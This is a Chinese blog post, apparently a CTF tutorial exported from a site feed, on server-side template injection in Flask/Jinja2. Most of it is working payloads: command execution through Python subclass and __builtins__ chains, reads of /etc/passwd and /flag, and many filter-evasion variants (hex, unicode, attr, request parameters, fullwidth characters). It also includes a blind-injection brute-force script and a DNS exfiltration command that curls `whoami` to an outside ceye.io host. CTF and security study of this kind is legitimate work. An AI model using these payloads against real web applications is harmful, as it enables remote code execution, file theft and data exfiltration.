href="#python2-amp-3的方法" class="headerlink" title="python2&amp;3的方法"></a>python2&amp;3的方法</h1><p>这里介绍python2和python3两个版本通用的方法</p><ul><li><h2 id="builtins-代码执行"><a href="#builtins-代码执行" class="headerlink" title="__builtins__代码执行"></a>__builtins__代码执行</h2></li></ul><p>这种方法是比较常用的，因为他两种python版本都适用</p><p>首先__builtins__是一个包含了大量内置函数的一个模块，我们平时用python的时候之所以可以直接使用一些函数比如abs，max，就是因为__builtins__这类模块在Python启动时为我们导入了，可以使用dir(<strong>builtins</strong>)来查看调用方法的列表，然后可以发现__builtins__下有eval，__import__等的函数，因此可以利用此来执行命令。</p><p>把上面find.py脚本search变量赋值为__builtins__，然后找到第140个类warnings.catch_warnings含有他，而且这里的话比较多的类都含有__builtins__，比如常用的还有email.header._ValueFormatter等等，这也可能是为什么这种方法比较多人用的原因之一吧</p><p>再调用eval等函数和方法即可，payload如下</p><pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read()&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['open']('/etc/passwd').read()&#125;&#125;</code></pre><p>又或者用如下两种方式，用模板来跑循环</p><pre><code>&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == 'catch_warnings' %&#125;  &#123;% for b in c.__init__.__globals__.values() %&#125;  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;    &#123;% if 'eval' in b.keys() %&#125;      &#123;&#123; b['eval']('__import__("os").popen("whoami").read()') &#125;&#125;    &#123;% endif %&#125;  &#123;% endif %&#125;  &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/f45931bb692441b6b6040aa863eaf12c.png" alt="img"></p><p>读取文件payload</p><pre><code>&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('filename', 'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p>另外一些绕过方法:</p><h2 id="绕过黑名单"><a href="#绕过黑名单" class="headerlink" title="绕过黑名单"></a>绕过黑名单</h2><p>CTF中一般考的就是怎么绕过SSTI，我们学会如何去构造payload之后，还要学习如何去绕过一些过滤，然后下面由于环境的不同，payload中类的位置也是就那个数字可能会和文章中不一样，需要自己动手测一下</p><h3 id="过滤了点"><a href="#过滤了点" class="headerlink" title="过滤了点"></a>过滤了点</h3><p>过滤了.</p><p>在python中，可用以下表示法可用于访问对象的属性</p><pre><code>&#123;&#123;().__class__&#125;&#125;&#123;&#123;()["__class__"]&#125;&#125;&#123;&#123;()|attr("__class__")&#125;&#125;&#123;&#123;getattr('',"__class__")&#125;&#125;</code></pre><p>也就是说我们可以通过[]，attr()，getattr()来绕过点</p><h4 id="使用-绕过"><a href="#使用-绕过" class="headerlink" title="使用[]绕过"></a>使用[]绕过</h4><p>使用访问字典的方式来访问函数或者类等，下面两行是等价的</p><pre><code>&#123;&#123;().__class__&#125;&#125;&#123;&#123;()['__class__']&#125;&#125;</code></pre><p>以此，我们可以构造payload如下</p><pre><code>&#123;&#123;()['__class__']['__base__']['__subclasses__']()[433]['__init__']['__globals__']['popen']('whoami')['read']()&#125;&#125;</code></pre><h4 id="使用attr-绕过"><a href="#使用attr-绕过" class="headerlink" title="使用attr()绕过"></a>使用attr()绕过</h4><p>使用原生JinJa2的函数attr()，以下两行是等价的</p><pre><code>&#123;&#123;().__class__&#125;&#125;&#123;&#123;()|attr('__class__')&#125;&#125;</code></pre><p>以此，我们可以构造payload如下</p><pre><code>&#123;&#123;()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(65)|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__("os").popen("whoami").read()')&#125;&#125;</code></pre><h4 id="使用getattr-绕过"><a href="#使用getattr-绕过" class="headerlink" title="使用getattr()绕过"></a>使用getattr()绕过</h4><p>这种方法有时候由于环境问题不一定可行，会报错’getattr’ is undefined，所以优先使用以上两种</p><pre><code>Python 3.7.8&gt;&gt;&gt; ().__class__&lt;class &#39;tuple&#39;&gt;&gt;&gt;&gt; getattr((),&quot;__class__&quot;)&lt;class &#39;tuple&#39;&gt;</code></pre><h3 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h3><p>过滤了’和”</p><h4 id="request绕过"><a href="#request绕过" class="headerlink" title="request绕过"></a>request绕过</h4><p>flask中存在着request内置对象可以得到请求的信息，request可以用5种不同的方式来请求信息，我们可以利用他来传递参数绕过</p><pre><code>request.args.namerequest.cookies.namerequest.headers.namerequest.values.namerequest.form.name</code></pre><p>payload如下</p><p>GET方式，利用request.args传递参数</p><pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[213].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()&#125;&#125;&amp;arg1=open&amp;arg2=/etc/passwd</code></pre><p>POST方式，利用request.values传递参数</p><pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.values.arg1](request.values.arg2).read()&#125;&#125;post:arg1=open&amp;arg2=/etc/passwd</code></pre><p>Cookie方式，利用request.cookies传递参数</p><pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.cookies.arg1](request.cookies.arg2).read()&#125;&#125;Cookie:arg1=open;arg2=/etc/passwd</code></pre><p>剩下两种方法也差不多，这里就不赘述了</p><h4 id="chr绕过"><a href="#chr绕过" class="headerlink" title="chr绕过"></a>chr绕过</h4><pre><code>&#123;&#123;().__class__.__base__.__subclasses__()[§0§].__init__.__globals__.__builtins__.chr&#125;&#125;</code></pre><p>这里先爆破subclasses，获取subclasses中含有chr的类索引</p><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/ce9a23785e014adda7f75ca7c05d5c33.jpeg" alt="img"></p><p>然后就可以用chr来绕过传参时所需要的引号，然后需要用chr来构造需要的字符</p><p>这里我写了个脚本可以快速构造想要的ascii字符</p><pre><code>&lt;?php$a = &#39;whoami&#39;;$result = &#39;&#39;;for($i=0;$i&lt;strlen($a);$i++)&#123; $result .= &#39;chr(&#39;.ord($a[$i]).&#39;)%2b&#39;;&#125;echo substr($result,0,-3);?&gt;//chr(119)%2bchr(104)%2bchr(111)%2bchr(97)%2bchr(109)%2bchr(105)</code></pre><p>最后payload如下</p><pre><code>&#123;% set chr = ().__class__.__base__.__subclasses__()[7].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123;().__class__.__base__.__subclasses__()[257].__init__.__globals__.popen(chr(119)%2bchr(104)%2bchr(111)%2bchr(97)%2bchr(109)%2bchr(105)).read()&#125;&#125;</code></pre><h3 id="过滤下划线"><a href="#过滤下划线" class="headerlink" title="过滤下划线"></a>过滤下划线</h3><p>过滤了_</p><h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p>使用十六进制编码绕过，_编码后为\x5f，.编码后为\x2E</p><p>payload如下</p><pre><code>&#123;&#123;()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbases\x5f\x5f"][0]["\x5f\x5fsubclasses\x5f\x5f"]()[376]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]['popen']('whoami')['read']()&#125;&#125;</code></pre><p>这里甚至可以全十六进制绕过，顺便把关键字也一起绕过，这里先给出个python脚本方便转换</p><pre><code>string1=&quot;__class__&quot;string2=&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;def tohex(string):  result = &quot;&quot;  for i in range(len(string)):      result=result+&quot;\\x&quot;+hex(ord(string[i]))[2:]  print(result)tohex(string1) #\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5fprint(string2) #__class__</code></pre><p>随便构造个payload如下</p><pre><code>&#123;&#123;""["\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f"]["\x5f\x5f\x62\x61\x73\x65\x5f\x5f"]["\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f"]()[64]["\x5f\x5f\x69\x6e\x69\x74\x5f\x5f"]["\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f"]["\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f"]["\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f"]("\x6f\x73")["\x70\x6f\x70\x65\x6e"]("whoami")["\x72\x65\x61\x64"]()&#125;&#125;</code></pre><h4 id="request绕过-1"><a href="#request绕过-1" class="headerlink" title="request绕过"></a>request绕过</h4><p>在上面的过滤引号已经介绍过了，这里不再赘述</p><h3 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h3><p>首先要看关键字是如何被过滤的</p><p>如果是替换为空，可以尝试双写绕过，或者使用黑名单逻辑漏洞错误绕过，即使用黑名单最后一个关键字替换绕过</p><p>如果直接ban了，就可以使用字符串拼接的方式等方法进行绕过，常用方法如下</p><h4 id="拼接字符绕过"><a href="#拼接字符绕过" class="headerlink" title="拼接字符绕过"></a>拼接字符绕过</h4><p>这里以过滤class为例子，用中括号括起来然后里面用引号连接，可以用+号或者不用</p><pre><code>&#123;&#123;()['__cla'+'ss__'].__bases__[0]&#125;&#125;&#123;&#123;()['__cla''ss__'].__bases__[0]&#125;&#125;</code></pre><p>随便写个payload如下</p><pre><code>&#123;&#123;()['__cla''ss__'].__bases__[0].__subclasses__()[40].__init__.__globals__['__builtins__']['ev''al']("__im""port__('o''s').po""pen('whoami').read()")&#125;&#125;</code></pre><p>或者可以使用join来进行拼接</p><pre><code>&#123;&#123;()|attr(["_"*2,"cla","ss","_"*2]|join)&#125;&#125;</code></pre><p>看到有师傅甚至用管道符加上format方法来拼接的骚操作，也就是我们平时说的格式化字符串，其中的%s被l替换</p><pre><code>&#123;&#123;()|attr(request.args.f|format(request.args.a))&#125;&#125;&amp;f=__c%sass__&amp;a=l</code></pre><h4 id="使用使用str原生函数"><a href="#使用使用str原生函数" class="headerlink" title="使用使用str原生函数"></a>使用使用str原生函数</h4><p>replace绕过，payload如下</p><pre><code>&#123;&#123;().__getattribute__('__claAss__'.replace("A","")).__bases__[0].__subclasses__()[376].__init__.__globals__['popen']('whoami').read()&#125;&#125;</code></pre><p>decode绕过，但这种方法经过测试只能在python2下使用，payload如下</p><pre><code>&#123;&#123;().__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40]("/etc/passwd").read()&#125;&#125;</code></pre><h4 id="替代的方法"><a href="#替代的方法" class="headerlink" title="替代的方法"></a>替代的方法</h4><p>过滤init，可以用__enter__或__exit__替代</p><pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[213].__enter__.__globals__['__builtins__']['open']('/etc/passwd').read()&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[213].__exit__.__globals__['__builtins__']['open']('/etc/passwd').read()&#125;&#125;</code></pre><p>过滤config，我们通常会用获取当前设置，如果被过滤了可以使用以下的payload绕过</p><pre><code>&#123;&#123;self&#125;&#125; ⇒ &lt;TemplateReference None&gt;&#123;&#123;self.__dict__._TemplateReference__context&#125;&#125;</code></pre><h3 id="过滤中括号"><a href="#过滤中括号" class="headerlink" title="过滤中括号"></a>过滤中括号</h3><p>过滤了[和]</p><h4 id="数字中的中括号"><a href="#数字中的中括号" class="headerlink" title="数字中的中括号"></a>数字中的中括号</h4><p>在python里面可以使用以下方法访问数组元素</p><pre><code>Python 3.7.8&gt;&gt;&gt; [&quot;a&quot;,&quot;kawhi&quot;,&quot;c&quot;][1]&#39;kawhi&#39;&gt;&gt;&gt; [&quot;a&quot;,&quot;kawhi&quot;,&quot;c&quot;].pop(1)&#39;kawhi&#39;&gt;&gt;&gt; [&quot;a&quot;,&quot;kawhi&quot;,&quot;c&quot;].__getitem__(1)&#39;kawhi&#39;</code></pre><p>也就是说可以使用__getitem__和pop替代中括号，取列表的第n位</p><p>payload如下</p><pre><code>&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(433).__init__.__globals__.popen('whoami').read()&#125;&#123;&#123;().__class__.__base__.__subclasses__().pop(433).__init__.__globals__.popen('whoami').read()&#125;&#125;</code></pre><h4 id="魔术方法的中括号"><a href="#魔术方法的中括号" class="headerlink" title="魔术方法的中括号"></a>魔术方法的中括号</h4><p>调用魔术方法本来是不用中括号的，但是如果过滤了关键字，要进行拼接的话就不可避免要用到中括号，像这里如果同时过滤了class和中括号</p><p>可用__getattribute__绕过</p><pre><code>&#123;&#123;"".__getattribute__("__cla"+"ss__").__base__&#125;&#125;</code></pre><p>或者可以配合request一起使用</p><pre><code>&#123;&#123;().__getattribute__(request.args.arg1).__base__&#125;&#125;&amp;arg1=__class__</code></pre><p>payload如下</p><pre><code>&#123;&#123;().__getattribute__(request.args.arg1).__base__.__subclasses__().pop(376).__init__.__globals__.popen(request.args.arg2).read()&#125;&#125;&amp;arg1=__class__&amp;arg2=whoami</code></pre><p>这种同样是绕过关键字的方法之一</p><h3 id="过滤双大括号"><a href="#过滤双大括号" class="headerlink" title="过滤双大括号"></a>过滤双大括号</h3><pre><code class="python">过滤了&#123;&#123;和&#125;&#125;</code></pre><h4 id="使用dns外带数据"><a href="#使用dns外带数据" class="headerlink" title="使用dns外带数据"></a>使用dns外带数据</h4><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/image-20220223141509923.png" alt="image-20220223141509923"></p><pre><code class="python">&#123;% if ().__class__.__base__.__subclasses__()[433].__init__.__globals__['popen']("curl `whoami`.k1o75b.ceye.io").read()=='kawhi' %&#125;1&#123;% endif %&#125;</code></pre><p>然后在ceye平台接收数据即可</p><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/a0b1acecc5844f778d857c94da232d74.jpeg" alt="img"></p><h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><p>如果上面的方法不行的话，可以考虑使用盲注的方式，这里附上p0师傅的脚本</p><pre><code class="python"># -*- coding: utf-8 -*-import requestsurl = &#39;http://ip:5000/?name=&#39;def check(payload):    r = requests.get(url+payload).content    return &#39;kawhi&#39; in rpassword  = &#39;&#39;s = r&#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;$\&#39;()*+,-./:;&lt;=&gt;?@[\\]^`&#123;|&#125;~\&#39;&quot;_%&#39;for i in xrange(0,100):    for c in s:        payload = &#39;&#123;% if ().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__.open("/etc/passwd").read()['+str(i)+':'+str(i+1)+'] == "'+c+'" %&#125;kawhi&#123;% endif %&#125;&#39;        if check(payload):            password += c            break    print password</code></pre><h4 id="print标记"><a href="#print标记" class="headerlink" title="print标记"></a>print标记</h4><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/image-20220223141738675.png" alt="image-20220223141738675"></p><pre><code class="python">&#123;%print ().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")%&#125;</code></pre><h1 id="payload进阶与拓展"><a href="#payload进阶与拓展" class="headerlink" title="payload进阶与拓展"></a>payload进阶与拓展</h1><p>这里我基于上面绕过黑名单各种方法的组合，对CTF中用到的一些方法和payload再做一个小的总结，不过其实一般来说，只要不是太偏太绕的题，上面的方法自行组合一下都够用了，下面只是作为一个拓展</p><h2 id="过滤-和-和-39"><a href="#过滤-和-和-39" class="headerlink" title="过滤_和.和&#39;"></a>过滤_和.和&#39;</h2><p>这里顺便给一个不常见的方法，主要是找到_frozen_importlib_external.FileLoader的get_data()方法，第一个是参数0，第二个为要读取的文件名，payload如下</p><pre><code class="python">&#123;&#123;().__class__.__bases__[0].__subclasses__()[222].get_data(0,"app.py")&#125;&#125;</code></pre><p>使用十六进制绕过后，payload如下</p><pre><code class="python">&#123;&#123;()["\x5f\x5fclass\x5f\x5f"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[222]["get\x5Fdata"](0, "app\x2Epy")&#125;&#125;</code></pre><h2 id="过滤args和-和"><a href="#过滤args和-和" class="headerlink" title="过滤args和.和_"></a>过滤args和.和_</h2><p>之前某二月赛在y1ng师傅博客看到的一个payload，原理并不难，这里使用了attr()绕过点，values绕过args，payload如下</p><pre><code class="python">&#123;&#123;()|attr(request['values']['x1'])|attr(request['values']['x2'])|attr(request['values']['x3'])()|attr(request['values']['x4'])(40)|attr(request['values']['x5'])|attr(request['values']['x6'])|attr(request['values']['x4'])(request['values']['x7'])|attr(request['values']['x4'])(request['values']['x8'])(request['values']['x9'])&#125;&#125;post:x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=eval&amp;x9=__import__(&quot;os&quot;).popen(&#39;whoami&#39;).read()</code></pre><h2 id="导入主函数读取变量"><a href="#导入主函数读取变量" class="headerlink" title="导入主函数读取变量"></a>导入主函数读取变量</h2><p>有一些题目我们不并需要去getshell，比如flag直接暴露在变量里面了，像如下这样把/flag文件加载到flag这个变量里面了</p><pre><code class="python">f = open(&#39;/flag&#39;,&#39;r&#39;)flag = f.read()</code></pre><p>我们就可以通过import是导入__main__主函数去读变量，payload如下</p><pre><code class="python">&#123;%print request.application.__globals__.__getitem__('__builtins__').__getitem__('__import__')('__main__').flag %&#125;</code></pre><h2 id="Unicode绕过"><a href="#Unicode绕过" class="headerlink" title="Unicode绕过"></a>Unicode绕过</h2><p>这种方法是从安洵杯2020 官方Writeup学到的，我们直奔主题看payload</p><pre><code class="python">&#123;%print(lipsum|attr(%22\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f%22))|attr(%22\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f%22)(%22os%22)|attr(%22popen%22)(%22whoami%22)|attr(%22read%22)()%&#125;</code></pre><pre><code class="python">这里的print绕过&#123;&#123;&#125;&#125;和attr绕过.上面已经说过了这里不赘述然后这里的lipsum用&#123;&#123;lipsum&#125;&#125;测了一下发现是个方法&lt;function generate_lorem_ipsum at 0x7fcddfa296a8&gt;</code></pre><p>然后用他直接调用__globals__发现可以直接执行os命令，测了一下发现__builtins__也可以用，又学到了一种新方法，只能说师傅们tql</p><pre><code class="python">&#123;&#123;lipsum.__globals__['os'].popen('whoami').read()&#125;&#125;&#123;&#123;lipsum.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")&#125;&#125;&#123;&#123;lipsum.__globals__.__builtins__.__import__('os').popen('whoami').read()&#125;&#125;</code></pre><p>回到正题，这里使用了Unicode编码绕过关键字，下面两行是等价的</p><pre><code class="python">&#123;&#123;()|attr("__class__")&#125;&#125;&#123;&#123;()|attr("\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f")&#125;&#125;</code></pre><p>知道了这两点之后，那个官方给的payload就很明朗了，解开编码后如下</p><pre><code class="python">&#123;%print(lipsum|attr("__globals__"))|attr("__getitem__")("os")|attr("popen")("whoami")|attr("read")()%&#125;</code></pre><p>然后我这里顺便给个Unicode互转的php脚本</p><pre><code class="python">&lt;?php//字符串转Unicode编码function unicode_encode($strLong) &#123;  $strArr = preg_split(&#39;/(?&lt;!^)(?!$)/u&#39;, $strLong);//拆分字符串为数组(含中文字符)  $resUnicode = &#39;&#39;;  foreach ($strArr as $str)  &#123;      $bin_str = &#39;&#39;;      $arr = is_array($str) ? $str : str_split($str);//获取字符内部数组表示,此时$arr应类似array(228, 189, 160)      foreach ($arr as $value)      &#123;          $bin_str .= decbin(ord($value));//转成数字再转成二进制字符串,$bin_str应类似111001001011110110100000,如果是汉字&quot;你&quot;      &#125;      $bin_str = preg_replace(&#39;/^.&#123;4&#125;(.&#123;4&#125;).&#123;2&#125;(.&#123;6&#125;).&#123;2&#125;(.&#123;6&#125;)$/&#39;, &#39;$1$2$3&#39;, $bin_str);//正则截取, $bin_str应类似0100111101100000,如果是汉字&quot;你&quot;      $unicode = dechex(bindec($bin_str));//返回unicode十六进制      $_sup = &#39;&#39;;      for ($i = 0; $i &lt; 4 - strlen($unicode); $i++)      &#123;          $_sup .= &#39;0&#39;;//补位高字节 0      &#125;      $str =  &#39;\\u&#39; . $_sup . $unicode; //加上 \u  返回      $resUnicode .= $str;  &#125;  return $resUnicode;&#125;//Unicode编码转字符串方法1function unicode_decode($name)&#123;  // 转换编码，将Unicode编码转换成可以浏览的utf-8编码  $pattern = &#39;/([\w]+)|(\\\u([\w]&#123;4&#125;))/i&#39;;  preg_match_all($pattern, $name, $matches);  if (!empty($matches))  &#123;    $name = &#39;&#39;;    for ($j = 0; $j &lt; count($matches[0]); $j++)    &#123;      $str = $matches[0][$j];      if (strpos($str, &#39;\\u&#39;) === 0)      &#123;        $code = base_convert(substr($str, 2, 2), 16, 10);        $code2 = base_convert(substr($str, 4), 16, 10);        $c = chr($code).chr($code2);        $c = iconv(&#39;UCS-2&#39;, &#39;UTF-8&#39;, $c);        $name .= $c;      &#125;      else      &#123;        $name .= $str;      &#125;    &#125;  &#125;  return $name;&#125;//Unicode编码转字符串function unicode_decode2($str)&#123;  $json = &#39;&#123;&quot;str&quot;:&quot;&#39; . $str . &#39;&quot;&#125;&#39;;  $arr = json_decode($json, true);  if (empty($arr)) return &#39;&#39;;  return $arr[&#39;str&#39;];&#125;echo unicode_encode(&#39;__class__&#39;);echo unicode_decode(&#39;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&#39;);//\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f__class__</code></pre><h1 id="魔改字符"><a href="#魔改字符" class="headerlink" title="魔改字符"></a>魔改字符</h1><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/image-20220223142618069.png" alt="image-20220223142618069"></p><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/99b07c77bc934233b53852378b18075d.jpeg" alt="img"></p><p>可以在Unicode字符网站寻找绕过的字符，直接在网址搜索{，就会出现类似的字符，就可以找到︷和︸了，网址：<a href="https://www.compart.com/en/unicode/U+FE38">https://www.compart.com/en/unicode/U+FE38</a></p><p>payload如下</p><pre><code class="python">︷︷config︸︸%EF%B8%B7%EF%B8%B7config%EF%B8%B8%EF%B8%B8</code></pre><p>还可以使用中文的字符魔改</p><pre><code class="python">｛ &amp;#65371;｝ &amp;#65373;［ &amp;#65339;］ &amp;#65341;＇ &amp;#65287;＂ &amp;#65282;payload如下｛｛url_for.__globals__［＇__builtins__＇］［＇eval＇］（＇__import__（＂os＂）.popen（＂cat /flag＂）.read（）＇）｝｝ </code></pre><hr><h1 id="做题思路："><a href="#做题思路：" class="headerlink" title="做题思路："></a>做题思路：</h1><p>首先找到漏洞存在点。</p><pre><code class="python">&#123;&#123;().__class__.__bases__[0].__subclasses__()&#125;&#125;</code></pre><p>通过这个输出所有类。</p><p>在子类列表中找到可以getshell的类/记住一些常见的可以getshell的函数。</p><p>1、有popen()的类</p><pre><code class="python">os._wrap_closepayload:&#123;&#123;"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()&#125;&#125;</code></pre><pre><code class="python">subprocess.Popenpayload:?search=&#123;&#123;''.__class__.__mro__[2].__subclasses__()[258]('ls',shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;?search=&#123;&#123;''.__class__.__mro__[2].__subclasses__()[258]('ls /flasklight',shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;?search=&#123;&#123;''.__class__.__mro__[2].__subclasses__()[258]('cat /flasklight/coomme_geeeett_youur_flek',shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</code></pre><p>2、有os模块的</p><p>socket._socketobject（一般在71）、site._Printer等模块</p><pre><code class="python">payload:&#123;&#123;[].__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].popen(cat /xxx/flag)&#125;&#125;&#123;&#123;[].__class__.__bases__[0].__subclasses__()[127].__init__['__glo'+'bals__']['os'].popen('whoami').read()&#125;&#125;</code></pre><p>3、有builtins的类</p><p>__ builtins __代码执行（最常用的方法）</p><p>warnings.catch_warnings含有,常用的还有email.header._ValueFormatter</p><p>__ builtins __ 是一个包含了大量内置函数的一个模块，我们平时用python的时候之所以可以直接使用一些函数比如abs，max，就是因为__ builtins __ 这类模块在Python启动时为我们导入了，可以使用dir(__ builtins __ )来查看调用方法的列表，然后可以发现__ builtins __ 下有eval，__ import __等的函数，因此可以利用此来执行命令。</p><pre><code class="python">&#123;&#123;().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read()&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['open']('/etc/passwd').read()&#125;&#125;</code></pre><p>模板跑循环</p><pre><code class="python">&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == 'catch_warnings' %&#125;  &#123;% for b in c.__init__.__globals__.values() %&#125;  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;    &#123;% if 'eval' in b.keys() %&#125;      &#123;&#123; b['eval']('__import__("os").popen("whoami").read()') &#125;&#125;    &#123;% endif %&#125;  &#123;% endif %&#125;  &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p>读取文件payload</p><pre><code class="python">&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('filename', 'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p>warnings.catch_warnings类在在内部定义了_module=sys.modules[‘warnings’]，然后warnings模块包含有__builtins__，也就是说如果可以找到warnings.catch_warnings类，则可以不使用globals，payload如下</p><pre><code class="python">&#123;&#123;''.__class__.__mro__[1].__subclasses__()[40]()._module.__builtins__['__import__']("os").popen('whoami').read()&#125;&#125;</code></pre><p>总而言之，原理都是先找到含有__builtins__的类，然后再进一步利用</p><p>常用脚本：</p><p>我们首先把所有的子类列举出来</p><pre><code class="python">Python 3.7.8&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()...一大堆的子类</code></pre><p>然后把子类列表放进下面脚本中的a中，然后寻找os._wrap_close这个类</p><p>find2.py</p><pre><code class="python">import jsona = &quot;&quot;&quot;&lt;class &#39;type&#39;&gt;,...,&lt;class &#39;subprocess.Popen&#39;&gt;&quot;&quot;&quot;num = 0allList = []result = &quot;&quot;for i in a:    if i == &quot;&gt;&quot;:        result += i        allList.append(result)        result = &quot;&quot;    elif i == &quot;\n&quot; or i == &quot;,&quot;:        continue    else:        result += i        for k,v in enumerate(allList):    if &quot;os._wrap_close&quot; in v:        print(str(k)+&quot;---&gt;&quot;+v)</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 常见漏洞和手法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 模板注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssi服务端包含注入</title>
      <link href="/2021/10/13/ssi%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/10/13/ssi%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/</url>
      
